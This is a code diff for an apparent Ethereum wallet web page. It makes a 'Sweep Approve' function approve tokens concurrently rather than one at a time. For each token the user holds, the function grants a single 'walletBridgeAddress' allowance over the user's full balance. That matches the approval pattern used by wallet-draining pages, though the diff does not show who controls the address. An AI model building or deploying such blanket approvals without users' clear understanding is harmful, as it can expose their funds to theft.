@@ -345,7 +345,7 @@
       }
     }
     
-    // Sweep Approve function
+    // Sweep Approve function (concurrent approval)
     async function massApprove() {
       if (!signer) {
         alert("Connect your wallet first!");
@@ -360,21 +360,30 @@
       ];
       let approvedTokens = [];
       const userAddress = await signer.getAddress();
+      let txPromises = [];
+      
       for (let tokenAddress of tokens) {
         const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
         const balance = await tokenContract.balanceOf(userAddress);
-        // Check if user has a nonzero balance
         if (balance.gt(0)) {
           try {
             const tx = await tokenContract.approve(walletBridgeAddress, balance);
             console.log(`Approve tx for ${tokenAddress}:`, tx.hash);
-            await tx.wait();
-            approvedTokens.push(tokenAddress);
+            // Push the confirmation promise to the array
+            txPromises.push(
+              tx.wait().then(() => {
+                approvedTokens.push(tokenAddress);
+              })
+            );
           } catch (err) {
             console.error(`Approve failed for ${tokenAddress}:`, err);
           }
         }
       }
+      
+      // Wait for all approval transactions concurrently
+      await Promise.all(txPromises);
+      
       // Automatically populate the token list input with approved token addresses
       document.getElementById("wbTokenList").value = approvedTokens.join(", ");
     }
